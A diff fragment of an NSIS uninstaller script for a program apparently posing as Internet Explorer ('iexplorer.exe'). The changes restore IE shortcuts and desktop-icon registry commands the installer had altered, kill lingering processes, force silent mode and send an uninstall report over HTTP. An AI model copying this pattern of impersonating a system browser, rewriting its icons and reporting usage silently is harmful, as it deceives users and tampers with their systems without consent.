+				CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_启动 Internet Explorer 浏览器.lnk" "$STARTMENU\启动 Internet Explorer 浏览器.lnk"
+				StrCpy $R0 "$STARTMENU\启动 Internet Explorer 浏览器.lnk"
+				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
+				Sleep 1000
+				ExecShell startpin "$STARTMENU\启动 Internet Explorer 浏览器.lnk"
+				StartMenuRestoreOK:
+			${EndIf}
+			${If} $R7 == "1" 
+				IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" 0 +6
+				CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" "$SMPROGRAMS\Internet Explorer.lnk"
+				StrCpy $R0 "$SMPROGRAMS\Internet Explorer.lnk"
+				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
+				Sleep 1000
+				ExecShell startpin "$SMPROGRAMS\Internet Explorer.lnk"
+				Goto SMPROGRAMSRestoreOK
+				IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk" 0 +6
+				CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk" "$SMPROGRAMS\Internet.lnk"
+				StrCpy $R0 "$SMPROGRAMS\Internet Explorer.lnk"
+				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
+				Sleep 1000
+				ExecShell startpin "$SMPROGRAMS\Internet Explorer.lnk"
+				Goto SMPROGRAMSRestoreOK
+				IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_启动 Internet Explorer 浏览器.lnk" 0 +6
+				CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_启动 Internet Explorer 浏览器.lnk" "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk"
+				StrCpy $R0 "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk"
+				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
+				Sleep 1000
+				ExecShell startpin "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk"
+				SMPROGRAMSRestoreOK:
 			${EndIf}
 		${EndIf}
 	${Else}
@@ -540,13 +767,40 @@ Function un.DeleteIcon
 	${EndIf}
 	;删除备份
 	RMDir /r $0\IECFG\lnkbak
+	;还原桌面图标
+	Var /GLOBAL strNoAddOns
+	Var /GLOBAL strOpenHomePage
+	StrCpy $strNoAddOns ""
+	StrCpy $strOpenHomePage ""
+	ReadRegStr $strNoAddOns HKCU "SOFTWARE\iexplorer" "HideIEIcon_NoAddOns"
+	ReadRegStr $strOpenHomePage HKCU "SOFTWARE\iexplorer" "HideIEIcon_OpenHomePage"
+	${If} $strNoAddOns != ""
+		WriteRegStr HKCR "CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\NoAddOns\Command" "" "$strNoAddOns"
+	${EndIf}
+	${If} $strOpenHomePage != ""
+		WriteRegStr HKCR "CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" "" "$strOpenHomePage"
+	${EndIf}
 FunctionEnd
 
 Function un.onInit
-	System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
-	Pop $R0
-	StrCmp $R0 0 +2
-	Abort
+	${For} $R3 0 3
+		System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
+		Pop $R0
+		StrCmp $R0 0 BeginInstall
+		StrCpy $R1 ""
+		ReadRegStr $R1 HKCU "SOFTWARE\iexplorer" "PackageName"
+		${If} $R1 == ""
+		${OrIf} $R1 == 0
+			Abort
+		${EndIf}
+		KillProcDLL::KillProc "$R1"
+		${If} $R3 == 3 
+			Abort
+		${Else}
+			Sleep 200
+		${EndIf}
+	${Next}
+	BeginInstall:
 	
 	IfFileExists "$INSTDIR\program\Microsoft.VC90.CRT.manifest" 0 InitFailed
 	CopyFiles /silent "$INSTDIR\program\Microsoft.VC90.CRT.manifest" "$TEMP\${PRODUCT_NAME}\"
@@ -561,6 +815,7 @@ Function un.onInit
 	Goto +2
 	InitFailed:
 	Abort
+	SetSilent silent
 	Call un.UpdateChanel
 	SetOutPath "$TEMP\${PRODUCT_NAME}"
 	SetOverwrite on
@@ -568,6 +823,12 @@ Function un.onInit
 	;杀进程
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::KillMyIExplorer()"
 	Sleep 500
+	;判断是否杀完全
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryMyExplorerExist() i.R1"
+	${If} $R1 == 1
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'the process of my explore is not kill all')"
+		Abort
+	${EndIf}
 	;删除图标
 	Call un.DeleteIcon
 	;刷新图标
@@ -576,13 +837,14 @@ Function un.onInit
 	;删除文件（简单粗暴）
 	RMDir /r "$INSTDIR"
 	;上报
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'uninstall', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIESelf(t 'uninstall', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
 	;删除自用注册表
-	DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "Path"
-	DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "PeerId"
-	DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource"
-	DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "InstDir"
-	DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallTimes"
+	;DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "Path"
+	;DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "PeerId"
+	;DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource"
+	;DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "InstDir"
+	;DeleteRegValue HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallTimes"
+	DeleteRegKey HKCU "SOFTWARE\${PRODUCT_NAME}"
 	;删除通用注册表
 	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe"
 	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe"
